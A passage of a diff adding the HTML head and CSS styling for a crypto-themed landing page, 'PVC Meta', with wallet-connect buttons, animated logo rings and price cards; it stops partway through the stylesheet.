@@ -1,0 +1,2601 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PVC Meta | Empowering the Future of Crypto Together</title>
+    <link rel="icon" type="image/png" href="/hero-cryptoce-logo.png">
+    <link rel="apple-touch-icon" href="/hero-cryptoce-logo.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800;900&family=Poppins:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+    <!-- Web3.js Library -->
+    <script src="https://cdn.jsdelivr.net/npm/web3@4.2.0/dist/web3.min.js"></script>
+    <!-- WalletConnect v1 removed: bridge servers are shut down -->
+
+    <!-- jQuery Library (Required for AJAX) -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <!-- SweetAlert2 Library (Required for Alert Dialogs) -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-cyan: #00d4ff;
+            --primary-teal: #006b7d;
+            --deep-teal: #003d4d;
+            --dark-bg: #001a24;
+            --light-cyan: #6ff5ff;
+            --accent-green: #00ffaa;
+            --network-color: rgba(0, 212, 255, 0.3);
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: var(--dark-bg);
+            color: white;
+            overflow-x: hidden;
+            line-height: 1.6;
+        }
+
+        /* Navigation */
+        nav {
+            background: linear-gradient(135deg, rgba(0, 106, 125, 0.95), rgba(0, 61, 77, 0.98));
+            backdrop-filter: blur(10px);
+            padding: 1rem 2rem;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 4px 30px rgba(0, 212, 255, 0.2);
+            animation: slideDown 0.6s ease-out;
+        }
+
+        @keyframes slideDown {
+            from {
+                transform: translateY(-100%);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .nav-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--primary-cyan);
+            text-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
+        }
+
+        .logo-icon {
+            width: auto;
+            height: 50px;
+            min-width: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            /* animation: pulse 2s infinite; removed pulse for static image transparency */
+        }
+
+        .logo-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            filter: drop-shadow(0 0 5px rgba(0, 212, 255, 0.5));
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            position: relative;
+            padding: 0.5rem 0;
+        }
+
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--primary-cyan);
+            transition: width 0.3s ease;
+        }
+
+        .nav-links a:hover {
+            color: var(--primary-cyan);
+        }
+
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+
+        .wallet-buttons {
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+        }
+
+        .wallet-btn {
+            padding: 0.7rem 1.5rem;
+            background: linear-gradient(135deg, var(--primary-cyan), var(--light-cyan));
+            border: none;
+            border-radius: 10px;
+            color: var(--deep-teal);
+            font-weight: 600;
+            font-size: 0.95rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Montserrat', sans-serif;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            box-shadow: 0 4px 15px rgba(0, 212, 255, 0.3);
+        }
+
+        .wallet-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 25px rgba(0, 212, 255, 0.5);
+        }
+
+        .wallet-btn.connected {
+            background: linear-gradient(135deg, var(--accent-green), #00cc88);
+        }
+
+        .wallet-btn.register {
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.2), rgba(0, 212, 255, 0.3));
+            border: 2px solid var(--primary-cyan);
+            color: white;
+        }
+
+        .wallet-address {
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+        }
+
+        .mobile-menu {
+            display: none;
+            flex-direction: column;
+            gap: 5px;
+            cursor: pointer;
+        }
+
+        .mobile-menu span {
+            width: 25px;
+            height: 3px;
+            background: var(--primary-cyan);
+            transition: all 0.3s ease;
+            border-radius: 2px;
+        }
+
+        /* Web3 Modal */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 2000;
+            backdrop-filter: blur(5px);
+            animation: fadeIn 0.3s ease;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content {
+            background: linear-gradient(135deg, var(--deep-teal), var(--primary-teal));
+            border: 2px solid var(--primary-cyan);
+            border-radius: 20px;
+            padding: 2.5rem;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 212, 255, 0.4);
+            animation: slideUp 0.3s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(50px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+        }
+
+        .modal-title {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--primary-cyan);
+        }
+
+        .close-modal {
+            background: none;
+            border: none;
+            font-size: 2rem;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .close-modal:hover {
+            color: var(--primary-cyan);
+            transform: rotate(90deg);
+        }
+
+        .modal-body {
+            display: flex;
+            flex-direction: column;
+            gap: 1.5rem;
+        }
+
+        .modal-info {
+            background: rgba(0, 212, 255, 0.1);
+            border: 1px solid var(--primary-cyan);
+            border-radius: 10px;
+            padding: 1rem;
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 0.95rem;
+        }
+
+        .network-info {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-top: 0.5rem;
+            color: var(--accent-green);
+            font-weight: 600;
+        }
+
+        .connect-wallet-btn {
+            padding: 1.2rem;
+            background: linear-gradient(135deg, var(--primary-cyan), var(--light-cyan));
+            border: none;
+            border-radius: 12px;
+            color: var(--deep-teal);
+            font-weight: 700;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Montserrat', sans-serif;
+            box-shadow: 0 4px 20px rgba(0, 212, 255, 0.3);
+        }
+
+        .connect-wallet-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 30px rgba(0, 212, 255, 0.5);
+        }
+
+        .connect-wallet-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .error-message {
+            background: rgba(255, 59, 48, 0.2);
+            border: 1px solid rgba(255, 59, 48, 0.5);
+            border-radius: 10px;
+            padding: 1rem;
+            color: #ff9999;
+            font-size: 0.9rem;
+        }
+
+        .success-message {
+            background: linear-gradient(135deg, var(--accent-green), #00cc88);
+            border: none;
+            border-radius: 12px;
+            padding: 1.5rem;
+            color: var(--deep-teal);
+            font-weight: 700;
+            font-size: 1.1rem;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0, 255, 170, 0.4);
+            animation: fadeIn 0.3s ease;
+            margin-top: 1rem;
+        }
+
+        /* Animated Network Background */
+        .network-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            opacity: 0.3;
+            will-change: transform;
+        }
+
+        .network-bg canvas {
+            width: 100%;
+            height: 100%;
+        }
+
+        /* Hero Section */
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 8rem 2rem 4rem;
+            position: relative;
+            z-index: 1;
+            will-change: opacity;
+        }
+
+        .subtitle {
+            font-size: 1.2rem;
+            color: white;
+            margin-bottom: 2rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            animation: fadeIn 0.8s ease-out 0.3s backwards;
+            font-weight: 600;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .hero h1 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: clamp(2.5rem, 8vw, 5rem);
+            font-weight: 900;
+            background: linear-gradient(135deg, white, var(--primary-cyan), var(--light-cyan), var(--accent-green));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 2rem;
+            line-height: 1.2;
+            animation: fadeIn 0.8s ease-out 0.5s backwards;
+            filter: drop-shadow(0 0 30px rgba(255, 255, 255, 0.3));
+        }
+
+        .hero-description {
+            font-size: clamp(1rem, 2vw, 1.3rem);
+            color: rgba(255, 255, 255, 0.9);
+            max-width: 700px;
+            margin: 0 auto 3rem;
+            animation: fadeIn 0.8s ease-out 0.7s backwards;
+        }
+
+        .cta-buttons {
+            display: flex;
+            gap: 1.5rem;
+            flex-wrap: wrap;
+            justify-content: center;
+            animation: fadeIn 0.8s ease-out 0.9s backwards;
+        }
+
+        .cta-btn {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 1rem;
+            padding: 2rem 2.5rem;
+            background: linear-gradient(135deg, rgba(0, 106, 125, 0.3), rgba(0, 61, 77, 0.5));
+            border: 2px solid var(--primary-cyan);
+            border-radius: 15px;
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 1.1rem;
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+            min-width: 200px;
+        }
+
+        .cta-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 212, 255, 0.3), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .cta-btn:hover::before {
+            left: 100%;
+        }
+
+        .cta-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 40px rgba(0, 212, 255, 0.4);
+            background: linear-gradient(135deg, rgba(0, 106, 125, 0.5), rgba(0, 61, 77, 0.7));
+        }
+
+        .btn-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, var(--primary-cyan), var(--light-cyan));
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            box-shadow: 0 5px 20px rgba(0, 212, 255, 0.3);
+        }
+
+        /* Hero Register Button */
+        .hero-register-btn {
+            padding: 1.5rem 3rem;
+            background: linear-gradient(135deg, var(--primary-cyan), var(--light-cyan));
+            border: none;
+            border-radius: 50px;
+            color: var(--deep-teal);
+            font-weight: 700;
+            font-size: 1.3rem;
+            cursor: pointer;
+            transition: all 0.4s ease;
+            font-family: 'Montserrat', sans-serif;
+            box-shadow: 0 8px 30px rgba(0, 212, 255, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero-register-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .hero-register-btn:hover::before {
+            left: 100%;
+        }
+
+        .hero-register-btn:hover {
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 12px 40px rgba(0, 212, 255, 0.6);
+        }
+
+        .hero-register-btn.connected {
+            background: linear-gradient(135deg, var(--accent-green), #00cc88);
+            box-shadow: 0 8px 30px rgba(0, 255, 170, 0.4);
+        }
+
+        .hero-register-btn.connected:hover {
+            box-shadow: 0 12px 40px rgba(0, 255, 170, 0.6);
+        }
+
+        /* Heading Register Button */
+        .heading-register-btn {
+            padding: 1.5rem 3.5rem;
+            background: linear-gradient(135deg, #ffffff, var(--primary-cyan));
+            border: 3px solid white;
+            border-radius: 50px;
+            color: var(--deep-teal);
+            font-weight: 800;
+            font-size: 1.4rem;
+            cursor: pointer;
+            transition: all 0.4s ease;
+            font-family: 'Montserrat', sans-serif;
+            box-shadow: 0 10px 40px rgba(255, 255, 255, 0.3), 0 0 60px rgba(0, 212, 255, 0.4);
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .heading-register-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.5), transparent);
+            transition: left 0.6s ease;
+        }
+
+        .heading-register-btn:hover::before {
+            left: 100%;
+        }
+
+        .heading-register-btn:hover {
+            transform: translateY(-8px) scale(1.05);
+            box-shadow: 0 15px 50px rgba(255, 255, 255, 0.5), 0 0 80px rgba(0, 212, 255, 0.6);
+            border-color: var(--light-cyan);
+        }
+
+        .heading-register-btn.connected {
+            background: linear-gradient(135deg, #ffffff, var(--accent-green));
+            border-color: var(--accent-green);
+            box-shadow: 0 10px 40px rgba(255, 255, 255, 0.3), 0 0 60px rgba(0, 255, 170, 0.4);
+        }
+
+        .heading-register-btn.connected:hover {
+            box-shadow: 0 15px 50px rgba(255, 255, 255, 0.5), 0 0 80px rgba(0, 255, 170, 0.6);
+        }
+
+        /* Animated Logo Circle */
+        .logo-circle {
+            width: 400px;
+            height: 400px;
+            margin: 4rem auto;
+            position: relative;
+            animation: fadeIn 0.8s ease-out 1.1s backwards;
+        }
+
+        .circle-container {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            animation: rotate 20s linear infinite;
+            will-change: transform;
+            transform: translateZ(0);
+        }
+
+        @keyframes rotate {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .outer-ring,
+        .middle-ring,
+        .inner-ring {
+            position: absolute;
+            border-radius: 50%;
+            border: 2px solid;
+        }
+
+        .outer-ring {
+            width: 100%;
+            height: 100%;
+            border-color: var(--primary-cyan);
+            border-width: 1px;
+            opacity: 0.15;
+            animation: pulse-ring 4s ease-in-out infinite, flicker 5s infinite;
+        }
+
+        .middle-ring {
+            width: 85%;
+            height: 85%;
+            top: 7.5%;
+            left: 7.5%;
+            border-color: var(--light-cyan);
+            border-width: 1px;
+            opacity: 0.25;
+            animation: pulse-ring 4s ease-in-out infinite 0.5s;
+        }
+
+        .inner-ring {
+            width: 70%;
+            height: 70%;
+            top: 15%;
+            left: 15%;
+            border-color: var(--accent-green);
+            border-width: 1px;
+            opacity: 0.35;
+            animation: pulse-ring 4s ease-in-out infinite 1s;
+        }
+
+        /* Tech HUD Elements */
+        .tech-ring {
+            position: absolute;
+            border-radius: 50%;
+            border: 2px dashed var(--primary-cyan);
+            opacity: 0.6;
+            filter: drop-shadow(0 0 10px var(--primary-cyan));
+        }
+
+        .tech-ring-1 {
+            width: 92%;
+            height: 92%;
+            top: 4%;
+            left: 4%;
+            border-style: dashed;
+            border-width: 3px;
+            animation: rotate-cw 15s linear infinite, flicker 3s infinite 1s;
+        }
+
+        .tech-ring-2 {
+            width: 78%;
+            height: 78%;
+            top: 11%;
+            left: 11%;
+            border-style: dotted;
+            border-width: 4px;
+            animation: rotate-ccw 10s linear infinite, flicker 4s infinite 2s;
+            opacity: 0.4;
+        }
+
+        .tech-ring-3 {
+            width: 60%;
+            height: 60%;
+            top: 20%;
+            left: 20%;
+            border-style: dashed;
+            border-width: 2px;
+            border-spacing: 12px;
+            animation: rotate-cw 25s linear infinite;
+            opacity: 0.8;
+        }
+
+        /* Scanner Sweep Effect */
+        .scanner-beam {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            background: conic-gradient(from 0deg, transparent 0%, rgba(0, 212, 255, 0.4) 10%, transparent 20%);
+            border-radius: 50%;
+            animation: rotate-cw 4s linear infinite;
+            pointer-events: none;
+            z-index: 1;
+            opacity: 0.6;
+        }
+
+        /* Corner Brackets */
+        .tech-bracket {
+            position: absolute;
+            width: 40px;
+            height: 40px;
+            border: 2px solid var(--primary-cyan);
+            opacity: 0.8;
+            filter: drop-shadow(0 0 8px var(--primary-cyan));
+            z-index: 3;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 8px;
+            font-family: monospace;
+            color: var(--primary-cyan);
+            white-space: nowrap;
+        }
+
+        .bracket-tl {
+            top: 15%;
+            left: 15%;
+            border-right: none;
+            border-bottom: none;
+        }
+
+        .bracket-tr {
+            top: 15%;
+            right: 15%;
+            border-left: none;
+            border-bottom: none;
+        }
+
+        .bracket-bl {
+            bottom: 15%;
+            left: 15%;
+            border-right: none;
+            border-top: none;
+        }
+
+        .bracket-br {
+            bottom: 15%;
+            right: 15%;
+            border-left: none;
+            border-top: none;
+        }
+
+        @keyframes flicker {
+
+            0%,
+            4%,
+            10%,
+            14%,
+            30%,
+            34%,
+            50%,
+            54%,
+            70%,
+            74%,
+            90%,
+            94%,
+            100% {
+                opacity: 1;
+            }
+
+            2%,
+            8%,
+            12%,
+            32%,
+            52%,
+            72%,
+            92% {
+                opacity: 0.7;
+            }
+        }
+
+        @keyframes rotate-cw {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes rotate-ccw {
+            from {
+                transform: rotate(360deg);
+            }
+
+            to {
+                transform: rotate(0deg);
+            }
+        }
+
+        @keyframes pulse-ring {
+
+            0%,
+            100% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.02);
+            }
+        }
+
+        .center-logo {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 180px;
+            height: 180px;
+            background: radial-gradient(circle, rgba(0, 26, 36, 0.9) 0%, rgba(0, 61, 77, 0.2) 100%);
+            border-radius: 50%;
+            border: 1px solid rgba(0, 212, 255, 0.2);
+            box-shadow: 0 0 40px rgba(0, 212, 255, 0.3), inset 0 0 20px rgba(0, 212, 255, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2;
+        }
+
+        .center-logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            animation: glow 2s ease-in-out infinite;
+            filter: drop-shadow(0 0 20px rgba(0, 212, 255, 0.5));
+        }
+
+        @keyframes glow {
+
+            0%,
+            100% {
+                filter: drop-shadow(0 0 20px rgba(0, 212, 255, 0.5));
+            }
+
+            50% {
+                filter: drop-shadow(0 0 40px rgba(0, 212, 255, 1));
+            }
+        }
+
+        .orbit-dots {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+        }
+
+        .dot {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: var(--accent-green);
+            border-radius: 50%;
+            box-shadow: 0 0 15px var(--accent-green);
+        }
+
+        .dot:nth-child(1) {
+            top: 0;
+            left: 50%;
+            animation: orbit-dot 4s linear infinite;
+        }
+
+        .dot:nth-child(2) {
+            top: 50%;
+            right: 0;
+            animation: orbit-dot 4s linear infinite 1s;
+        }
+
+        .dot:nth-child(3) {
+            bottom: 0;
+            left: 50%;
+            animation: orbit-dot 4s linear infinite 2s;
+        }
+
+        .dot:nth-child(4) {
+            top: 50%;
+            left: 0;
+            animation: orbit-dot 4s linear infinite 3s;
+        }
+
+        @keyframes orbit-dot {
+
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+
+            50% {
+                opacity: 0.5;
+                transform: scale(1.5);
+            }
+        }
+
+        /* Error Message */
+        .error-section {
+            background: rgba(255, 59, 48, 0.1);
+            border: 1px solid rgba(255, 59, 48, 0.3);
+            border-radius: 10px;
+            padding: 1.5rem;
+            margin: 3rem auto;
+            max-width: 600px;
+            text-align: center;
+            color: #ff9999;
+        }
+
+        /* Live Crypto Data Section */
+        .crypto-data-section {
+            max-width: 1400px;
+            margin: 4rem auto;
+            padding: 2rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        .section-header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .section-header h2 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: clamp(2rem, 5vw, 3.5rem);
+            font-weight: 800;
+            background: linear-gradient(135deg, white, var(--primary-cyan), var(--accent-green));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 1rem;
+        }
+
+        .section-subtitle {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 1.1rem;
+        }
+
+        .crypto-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin-bottom: 3rem;
+        }
+
+        .crypto-card {
+            background: linear-gradient(135deg, rgba(0, 106, 125, 0.2), rgba(0, 61, 77, 0.3));
+            border: 2px solid var(--primary-cyan);
+            border-radius: 20px;
+            padding: 2rem;
+            backdrop-filter: blur(10px);
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .crypto-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 212, 255, 0.1), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .crypto-card:hover::before {
+            left: 100%;
+        }
+
+        .crypto-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 50px rgba(0, 212, 255, 0.4);
+            border-color: var(--accent-green);
+        }
+
+        .crypto-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 1.5rem;
+        }
+
+        .crypto-name {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .crypto-icon {
+            font-size: 2.5rem;
+            filter: drop-shadow(0 0 10px rgba(0, 212, 255, 0.5));
+        }
+
+        .crypto-symbol {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--primary-cyan);
+        }
+
+        .crypto-fullname {
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .crypto-price {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 2rem;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 1rem;
+        }
+
+        .crypto-change {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.5rem 1rem;
+            border-radius: 10px;
+            font-weight: 600;
+            font-size: 1.1rem;
+        }
+
+        .crypto-change.positive {
+            background: rgba(0, 255, 170, 0.2);
+            color: var(--accent-green);
+        }
+
+        .crypto-change.negative {
+            background: rgba(255, 59, 48, 0.2);
+            color: #ff6b6b;
+        }
+
+        .crypto-stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin-top: 1.5rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid rgba(0, 212, 255, 0.2);
+        }
+
+        .stat-item {
+            display: flex;
+            flex-direction: column;
+            gap: 0.3rem;
+        }
+
+        .stat-label {
+            font-size: 0.85rem;
+            color: rgba(255, 255, 255, 0.5);
+            font-weight: 500;
+        }
+
+        .stat-value {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: white;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 3rem;
+            color: var(--primary-cyan);
+            font-size: 1.2rem;
+        }
+
+        .loading::after {
+            content: '...';
+            animation: dots 1.5s steps(4, end) infinite;
+        }
+
+        @keyframes dots {
+
+            0%,
+            20% {
+                content: '.';
+            }
+
+            40% {
+                content: '..';
+            }
+
+            60%,
+            100% {
+                content: '...';
+            }
+        }
+
+        /* Market Stats Banner */
+        .market-banner {
+            background: linear-gradient(135deg, rgba(0, 106, 125, 0.3), rgba(0, 61, 77, 0.4));
+            border: 1px solid var(--primary-cyan);
+            border-radius: 15px;
+            padding: 2rem;
+            margin-bottom: 3rem;
+            backdrop-filter: blur(10px);
+        }
+
+        .banner-stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 2rem;
+            text-align: center;
+        }
+
+        .banner-stat {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        .banner-stat-label {
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.6);
+            font-weight: 500;
+        }
+
+        .banner-stat-value {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--primary-cyan);
+        }
+
+        .banner-stat-icon {
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
+        }
+
+        /* Footer Section */
+        .footer {
+            background: linear-gradient(135deg, var(--deep-teal), var(--primary-teal));
+            padding: 4rem 2rem 2rem;
+            margin-top: 6rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        .footer-container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .footer-content {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 3rem;
+            margin-bottom: 3rem;
+        }
+
+        .footer-logo {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--primary-cyan);
+        }
+
+        .footer-description {
+            color: rgba(255, 255, 255, 0.8);
+            line-height: 1.8;
+            margin-bottom: 2rem;
+        }
+
+        .language-selector {
+            display: flex;
+            gap: 1rem;
+        }
+
+        .lang-btn {
+            padding: 0.5rem 1rem;
+            background: rgba(0, 212, 255, 0.2);
+            border: 1px solid var(--primary-cyan);
+            border-radius: 8px;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+        }
+
+        .lang-btn:hover,
+        .lang-btn.active {
+            background: var(--primary-cyan);
+            color: var(--deep-teal);
+            transform: translateY(-2px);
+        }
+
+        .quick-links h3 {
+            font-family: 'Montserrat', sans-serif;
+            color: var(--primary-cyan);
+            margin-bottom: 1.5rem;
+            font-size: 1.3rem;
+        }
+
+        .quick-links ul {
+            list-style: none;
+        }
+
+        .quick-links a {
+            color: rgba(255, 255, 255, 0.8);
+            text-decoration: none;
+            display: block;
+            padding: 0.5rem 0;
+            transition: all 0.3s ease;
+        }
+
+        .quick-links a:hover {
+            color: var(--primary-cyan);
+            padding-left: 10px;
+        }
+
+        .footer-bottom {
+            text-align: center;
+            padding-top: 2rem;
+            border-top: 1px solid rgba(0, 212, 255, 0.3);
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        /* Responsive Design */
+        @media (max-width: 968px) {
+            .wallet-buttons {
+                display: none;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                width: 100%;
+                background: linear-gradient(135deg, rgba(0, 106, 125, 0.98), rgba(0, 61, 77, 0.98));
+                flex-direction: column;
+                padding: 2rem;
+                gap: 1rem;
+            }
+
+            .nav-links.active {
+                display: flex;
+            }
+
+            .mobile-menu {
+                display: flex;
+            }
+
+            .mobile-menu.active span:nth-child(1) {
+                transform: rotate(45deg) translate(8px, 8px);
+            }
+
+            .mobile-menu.active span:nth-child(2) {
+                opacity: 0;
+            }
+
+            .mobile-menu.active span:nth-child(3) {
+                transform: rotate(-45deg) translate(6px, -6px);
+            }
+
+            .hero {
+                padding: 6rem 1.5rem 3rem;
+            }
+
+            .cta-buttons {
+                flex-direction: column;
+            }
+
+            .cta-btn {
+                width: 100%;
+            }
+
+            .hero-register-btn {
+                width: 100%;
+                padding: 1.3rem 2rem;
+                font-size: 1.1rem;
+            }
+
+            .heading-register-btn {
+                width: 90%;
+                padding: 1.2rem 2rem;
+                font-size: 1.1rem;
+                letter-spacing: 0.5px;
+            }
+
+            .logo-circle {
+                width: 300px;
+                height: 300px;
+            }
+
+            .center-logo {
+                width: 140px;
+                height: 140px;
+            }
+
+            .center-logo::before {
+                font-size: 60px;
+            }
+
+            .footer-content {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 480px) {
+            nav {
+                padding: 1rem;
+            }
+
+            .logo {
+                font-size: 1.2rem;
+            }
+
+            .logo-icon {
+                width: auto;
+                height: 40px;
+                min-width: 40px;
+            }
+
+            .subtitle {
+                font-size: 0.9rem;
+            }
+
+            .logo-circle {
+                width: 250px;
+                height: 250px;
+            }
+
+            .center-logo {
+                width: 110px;
+                height: 110px;
+            }
+        }
+
+        /* Scroll Animations */
+        .fade-in-up {
+            opacity: 0;
+            transform: translateY(30px);
+            transition: all 0.6s ease-out;
+        }
+
+        .fade-in-up.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* Floating particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .particle {
+            position: absolute;
+            background: var(--primary-cyan);
+            border-radius: 50%;
+            opacity: 0.2;
+            animation: float linear infinite;
+            will-change: transform, opacity;
+            transform: translateZ(0);
+        }
+
+        @keyframes float {
+            0% {
